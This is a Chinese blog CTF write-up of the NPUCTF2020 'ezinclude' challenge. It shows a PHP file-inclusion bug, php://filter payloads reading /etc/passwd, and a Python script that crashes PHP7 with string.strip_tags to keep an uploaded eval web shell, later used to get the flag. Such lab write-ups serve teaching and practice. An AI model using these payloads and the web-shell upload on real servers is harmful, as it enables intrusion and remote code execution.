@@ -1,0 +1,137 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>NPUCTF2020 ezinclude_0x90-0x9F | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">NPUCTF2020 ezinclude_0x90-0x9F</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/">2022-02-13</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%88%B7%E9%A2%98/">刷题</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>最近看了下一些大佬的博客，被打击到了，要学习的有太多了，加油吧！</p>
+<p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124200210.png" alt="image-20220213124200210"></p>
+<p>进去直接来个错误？？？WTF?</p>
+<p>看下源码</p>
+<p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124258414.png" alt="image-20220213124258414"></p>
+<p>疑似哈希长度拓展攻击，抓下包看看</p>
+<p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124348253.png" alt="image-20220213124348253"></p>
+<p>芜湖，hash直接给我了？</p>
+<p>直接传好像不太行?</p>
+<p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124718726.png" alt="image-20220213124718726"></p>
+<p>祭出神器burp</p>
+<p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124626306.png" alt="image-20220213124626306"></p>
+<p>得到文件名 flflflflag.php</p>
+<p>访问一下文件:</p>
+<p>得到如下response</p>
+<pre><code class="html">HTTP/1.1 200 OK
+Server: openresty
+Date: Sun, 13 Feb 2022 04:47:35 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 241
+Connection: close
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.0.33
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;
+           window.location.href=&quot;404.html&quot;;
+&lt;/script&gt;
+&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;
+&lt;/head&gt;
+&lt;&gt;
+&lt;body&gt;
+include($_GET[&quot;file&quot;])&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>我已经有了女朋友所以我比出题人强(手动狗头)</p>
+<p>include 函数好家伙，文件包含应该有了</p>
+<p>来读取下源码</p>
+<p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213125612027.png" alt="image-20220213125612027"></p>
+<p>解码如下:</p>
+<pre><code class="php">&lt;?php
+$file=$_GET[&#39;file&#39;];
+if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;
+    die(&#39;nonono&#39;);
+&#125;
+@include($file);
+echo &#39;include($_GET[&quot;file&quot;])&#39;;
+?&gt;
+</code></pre>
+<p>过滤了很多东西，没法命令执行了。</p>
+<p>那就扫一下目录把:</p>
+<p>最终扫出来了一个</p>
+<p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213131840887.png" alt="image-20220213131840887"></p>
+<p>这个目录应该是告诉我们文件的名字，来结合文件包含使用。所以我们就要尝试去传shell</p>
+<p>可以用php7 segment fault特性</p>
+<blockquote>
+<p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p>
+</blockquote>
+<p>参考链接；<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p>
+<p>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这里我们可以直接知道文件名就不需要爆破了</p>
+<p>该方法仅适用于以下php7版本，php5并不存在该崩溃：</p>
+<pre><code>• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复
+
+• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复
+
+• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复
+</code></pre>
+<p>payload</p>
+<pre><code class="php">php &lt; 7.2
+php://filter/string.strip_tags/resource=/etc/passwd
+
+php7 老版本通杀
+php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre>
+<p>由于tmp目录一般是不可访问的，所以该漏洞常常和文件包含结合起来使用</p>
+<p>exp如下:</p>
+<pre><code class="python">import requests
+from io import BytesIO
+url=&quot;http://ec8f0167-007a-4dd5-84fc-989e567ab77c.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;
+payload=&quot;&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;&quot;
+files=&#123;
+    &quot;file&quot;:BytesIO(payload.encode())
+&#125;
+r=requests.post(url=url,files=files,allow_redirects=False)
+print(r.text)
+</code></pre>
+<p>运行</p>
+<p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213134031132.png" alt="image-20220213134031132"></p>
+<p>这里多了一个文件</p>
+<p>使用蚁剑连接</p>
+<p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135012413.png" alt="image-20220213135012413"></p>
+<p>测试成功了，但是无法添加，，莫名的错误</p>
+<p>同理那就再添加个phpinfo吧</p>
+<p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135404774.png" alt="image-20220213135404774"></p>
+<p>成功找到flag</p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/">https://sakurahack-y.github.io/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB/">代码\命令执行类</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/">红明谷CTF 2021 write_shell_0x81-0x8F &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
